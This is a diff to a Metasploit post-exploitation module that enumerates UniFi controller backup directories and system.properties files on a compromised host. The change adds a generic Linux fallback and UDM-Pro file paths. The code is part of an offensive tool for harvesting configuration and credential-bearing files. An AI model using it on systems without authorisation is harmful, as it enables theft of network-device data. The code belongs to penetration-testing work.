@@ -73,7 +73,8 @@ class MetasploitModule < Msf::Post
     case session.platform
     when 'windows'
       files = session.fs.dir.foreach(d)
-    when 'linux', 'osx'
+    else
+    #when 'linux', 'osx', 'unifi'
       # osx will have a space in it by default, so we wrap the directory in quotes
       files = cmd_exec("ls '#{d}'").split(/\r\n|\r|\n/)
     end
@@ -119,30 +120,35 @@ class MetasploitModule < Msf::Post
   end
 
   def run
+    backup_locations = []
+    sprop_locations = []
+
+    vprint_status("OS Detected: %s" %(session.platform))
+
     case session.platform
     when 'windows'
-      backup_locations = []
-      sprop_locations = []
       grab_user_profiles().each do |user|
         backup_locations << "#{user['ProfileDir']}\\Ubiquiti Unifi\\data\\backup"
         sprop_locations << "#{user['ProfileDir']}\\Ubiquiti UniFi\\data\\system.properties"
       end
-    when 'linux'
-      # https://help.ubnt.com/hc/en-us/articles/226218448-UniFi-How-to-Configure-Auto-Backup
-      backup_locations = [
-        '/data/autobackup', #Cloud key
-        '/var/lib/unifi/backup' #software install linux
-      ]
-
-      sprop_locations = ['/var/lib/unifi/system.properties'] #default location on 5.10.19 on ubuntu 18.04
     when 'osx'
       # https://github.com/rapid7/metasploit-framework/pull/11548#issuecomment-472568795
-      backup_locations = []
-      sprop_locations = []
       get_users.each do |user|
         backup_locations << "/Users/#{user['name']}/Library/Application Support/UniFi/data/backup"
         sprop_locations  << "/Users/#{user['name']}/Library/Application Support/Unifi/data/system.properties"
       end
+    else #linux, or a similar device from ubiquiti
+      # https://help.ubnt.com/hc/en-us/articles/226218448-UniFi-How-to-Configure-Auto-Backup
+      backup_locations = [
+        '/data/autobackup', #Cloud key
+        '/var/lib/unifi/backup', #software install linux
+        '/mnt/data/unifi/data/backup' #UDM-PRO (possibly UDM as well)
+      ]
+
+      sprop_locations = [
+        '/var/lib/unifi/system.properties', #default location on 5.10.19 on ubuntu 18.04
+        '/mnt/data/unifi/data/system.properties' #UDM-Pro (possibly UDM as well)
+      ]
     end
 
     # read system.properties
